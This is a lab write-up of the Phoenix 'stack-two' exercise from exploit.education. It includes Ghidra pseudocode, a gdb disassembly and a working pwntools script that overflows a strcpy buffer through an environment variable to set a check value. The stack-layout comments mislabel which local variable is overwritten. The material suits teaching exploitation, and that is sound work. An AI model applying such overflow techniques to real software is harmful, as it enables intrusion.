# &#35; stack-2

#### &#42; pseudocode using ghidra
```bash

void main(void)

{
  undefined *puVar1;
  undefined auStack96 [8];
  undefined local_58 [64];
  int local_18;
  char *local_14;
  undefined *puStack12;
  
  puStack12 = &stack0x00000004;
  puts("Welcome to phoenix/stack-two, brought to you by https://exploit.education");
  local_14 = getenv("ExploitEducation");
  puVar1 = auStack96;
  if (local_14 == (char *)0x0) {
    errx();
    puVar1 = &stack0xffffff90;
  }
  local_18 = 0;
  *(char **)(puVar1 + -0xc) = local_14;
  *(undefined **)(puVar1 + -0x10) = local_58;
  *(undefined4 *)(puVar1 + -0x14) = 0x80485a4;
  strcpy(*(char **)(puVar1 + -0x10),*(char **)(puVar1 + -0xc));
  if (local_18 == 0xd0a090a) {
    *(char **)(puVar1 + -0x10) =
         "Well done, you have successfully set changeme to the correct value";
    *(undefined4 *)(puVar1 + -0x14) = 0x80485be;
    puts(*(char **)(puVar1 + -0x10));
  }
  else {
    *(int *)(puVar1 + -0xc) = local_18;
    *(char **)(puVar1 + -0x10) = "Almost! changeme is currently 0x%08x, we want 0x0d0a090a\n";
    *(undefined4 *)(puVar1 + -0x14) = 0x80485d4;
    printf(*(char **)(puVar1 + -0x10));
  }
  *(undefined4 *)(puVar1 + -0x10) = 0;
                    /* WARNING: Subroutine does not return */
  *(undefined4 *)(puVar1 + -0x14) = 0x80485e1;
  exit(*(int *)(puVar1 + -0x10));
}
```


#### &#42; check to binary
```bash
$ file /opt/phoenix/i486/stack-two
/opt/phoenix/i486/stack-two: setuid, setgid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV),
  dynamically linked, interpreter /opt/phoenix/i486-linux-musl/lib/ld-musl-i386.so.1, not stripped

$ checksec /opt/phoenix/i486/stack-two
[*] '/opt/phoenix/i486/stack-two'
    Arch:     i386-32-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x8048000)
    RWX:      Has RWX segments
    RPATH:    '/opt/phoenix/i486-linux-musl/lib'
    
```


#### &#42; how it work
```bash
$ /opt/phoenix/i486/stack-two
Welcome to phoenix/stack-two, brought to you by https://exploit.education
stack-two: please set the ExploitEducation environment variable

```


#### &#42; vulnerable point
#### buffer overflow using strcpy() of ExploitEducation env variable.
```bash
#### we can overwrite local_14 variable using ExploitEducation env variable
```


#### &#42; stack structure
#### local_54[64] + local_14[4] + dummy[8] + sfp[4] + ret[4]
```bash

$ gdb /opt/phoenix/i486/stack-two -q
GEF for linux ready, type `gef' to start, `gef config' to configure
71 commands loaded for GDB 8.2.1 using Python engine 3.5
[*] 2 commands could not be loaded, run `gef missing` to know why.
Reading symbols from /opt/phoenix/i486/stack-two...(no debugging symbols found)...done.
gef> disass main
Dump of assembler code for function main:
   0x08048545 <+0>:	lea    ecx,[esp+0x4]
   0x08048549 <+4>:	and    esp,0xfffffff0
   0x0804854c <+7>:	push   DWORD PTR [ecx-0x4]
   0x0804854f <+10>:	push   ebp
   0x08048550 <+11>:	mov    ebp,esp
   0x08048552 <+13>:	push   ecx
   0x08048553 <+14>:	sub    esp,0x54
   0x08048556 <+17>:	sub    esp,0xc
   0x08048559 <+20>:	push   0x8048630
   0x0804855e <+25>:	call   0x8048370 <puts@plt>
   0x08048563 <+30>:	add    esp,0x10
   0x08048566 <+33>:	sub    esp,0xc
   0x08048569 <+36>:	push   0x804867a                  => ExploitEducation string
   0x0804856e <+41>:	call   0x8048360 <getenv@plt>
   0x08048573 <+46>:	add    esp,0x10
   0x08048576 <+49>:	mov    DWORD PTR [ebp-0xc],eax    => local_14(ExploitEducation env)
   0x08048579 <+52>:	cmp    DWORD PTR [ebp-0xc],0x0    => if (local_14 == (char *)0x0)
   0x0804857d <+56>:	jne    0x804858e <main+73>
   0x0804857f <+58>:	sub    esp,0x8
   0x08048582 <+61>:	push   0x804868c
   0x08048587 <+66>:	push   0x1
   0x08048589 <+68>:	call   0x8048380 <errx@plt>
   0x0804858e <+73>:	mov    DWORD PTR [ebp-0x10],0x0   => local_18 = 0
   0x08048595 <+80>:	sub    esp,0x8
   0x08048598 <+83>:	push   DWORD PTR [ebp-0xc]        => local_14(env) on stack
   0x0804859b <+86>:	lea    eax,[ebp-0x50]
   0x0804859e <+89>:	push   eax                        
   0x0804859f <+90>:	call   0x8048340 <strcpy@plt>     => strcpy(ebp-0x50, local_14(env))
   0x080485a4 <+95>:	add    esp,0x10
   0x080485a7 <+98>:	mov    eax,DWORD PTR [ebp-0x10]
   0x080485aa <+101>:	cmp    eax,0xd0a090a
   0x080485af <+106>:	jne    0x80485c3 <main+126>
   0x080485b1 <+108>:	sub    esp,0xc
   0x080485b4 <+111>:	push   0x80486c4
   0x080485b9 <+116>:	call   0x8048370 <puts@plt>
   0x080485be <+121>:	add    esp,0x10
   0x080485c1 <+124>:	jmp    0x80485d7 <main+146>
   0x080485c3 <+126>:	mov    eax,DWORD PTR [ebp-0x10]
   0x080485c6 <+129>:	sub    esp,0x8
   0x080485c9 <+132>:	push   eax
   0x080485ca <+133>:	push   0x8048708
   0x080485cf <+138>:	call   0x8048350 <printf@plt>
   0x080485d4 <+143>:	add    esp,0x10
   0x080485d7 <+146>:	sub    esp,0xc
   0x080485da <+149>:	push   0x0
   0x080485dc <+151>:	call   0x8048390 <exit@plt>
End of assembler dump.
gef>


gef> x/xw $ebp-0x50         => local_14(env)
0xffffd638:	0x00000000
gef>
gef> x/xw $ebp-0x10         => local_18
0xffffd678:	0x00000000

gef> x/24xw $ebp-0x50
0xffffd638:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffd648:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffd658:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffd668:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffd678:	0x42424242	0xffffdf00	0x00000000	0xffffd6a0
0xffffd688:	0xffffd71c	0xf7f8f654	0xffffd714	0x00000001
gef>



```

#### &#42; payload
```bash
#### local_54[64] + local_14[4] + dummy[8] + sfp[4] + ret[4]
payload  = b""
payload += b"A"*64
payload += p32(0xd0a090a)
```

#### &#42; exploit code
```bash
$ cat exp_stack2.py
from pwn import *

context.arch='i386'
#context.log_level='debug'

filename="/opt/phoenix/i486/stack-two"

payload  = b""
payload += b"A"*64
payload += p32(0xd0a090a)

conn = process(filename, env={'ExploitEducation': payload})
print( conn.recvline() )

conn.interactive()



$ python exp_stack2.py
[+] Starting local process '/opt/phoenix/i486/stack-two': pid 687
[*] Process '/opt/phoenix/i486/stack-two' stopped with exit code 0 (pid 687)
Welcome to phoenix/stack-two, brought to you by https://exploit.education

[*] Switching to interactive mode
Well done, you have successfully set changeme to the correct value
[*] Got EOF while reading in interactive
$

```


